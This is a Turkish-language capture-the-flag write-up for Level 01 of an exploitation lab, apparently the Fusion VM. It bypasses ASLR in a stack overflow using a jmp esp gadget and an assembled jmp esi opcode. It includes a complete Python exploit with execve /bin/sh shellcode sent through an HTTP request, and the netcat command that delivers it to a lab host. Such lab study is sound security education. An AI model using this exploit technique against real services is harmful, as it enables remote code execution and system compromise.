# `Level 01 Writeup`

![source code](img/level01/level01_source-code.png)

![about](img/level01/level01_about.png)

Bir önceki soru ile aynı kaynak koda sahip. Ancak bu levelin tek farkı `ASLR (Address Space Layout Randomisation)` korumasının açık olması.

Aynı kaynak koda sahip olduğu için bir önceki levelde yazdığımız exploiti kullanabiliriz. Ancak `ASLR` koruması açık olduğundan dolayı exploitimizi güncellememiz gerekecek.

Hatırlayacağınız gibi `offset+4` karakterden sonra yazdığımız karakterler `ESI` adresinden itibaren tutulmaya başlanıyor. Bu yüzden öncelikle `jmp esi` komutu programımızın içerisinde hiç kullanılmış mı bakalım.

![0](img/level01/level01_0.png)

level01 programımızın .text bölümünün içerisinde `jmp esi` işlemini gerçekleştiren bir `opcode` bulamadık ancak `jmp esp` komutunu gerçekleştiren bir opcode bulduk.

O zaman `jmp esp` opcode'u `eip` üzerine yazıp zıpladıktan sonra `jmp esi` işlemi yapan bir opcode üretip eklersek istediğimiz işlemi dolaylı yoldan gerçekleştirmiş olacağız. Peki nasıl üreteceğiz/bulacağız bu `jmp esi` işlemini yapan opcode ' u

```bash
    ; level01.asm
    ; find jmp esi opcode
    [SECTION .text]
    global _start
    _start:
            jmp esi
            int 80h

```

```bash

    fusion@fusion:~$ nasm -f elf level01.asm
    fusion@fusion:~$ objdump -d level01.o

```

```bash

level01.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:	ff e6                	jmp    *%esi
   2:	cd 80                	int    $0x80


```

Evet şu şekilde kısacık bir assembly kodu üzerinden aradığımız `jmp esi` opcode ' unu `\xff\xe6` olarak bulduk. Şimdi exploitimiz güncelleyebiliriz.

```python

# http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = ""
shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"

payload = ""
payload += "GET "
payload += "A"*139 # offset
payload += "\x4f\x9f\x04\x08" #jmp esp
payload += "\xff\xe6" # jmp esi
payload += " HTTP/1.1"
payload += "\x90"*100 # nop
payload += shellcode

print payload

```

Exploitimizde hazır olduğuna göre artık test edebiliriz

```bash

[alp@eren ~]$ (python2 exploit.py ; cat) | nc 192.168.56.6 20001

```

![1](img/level01/level01_1.png)
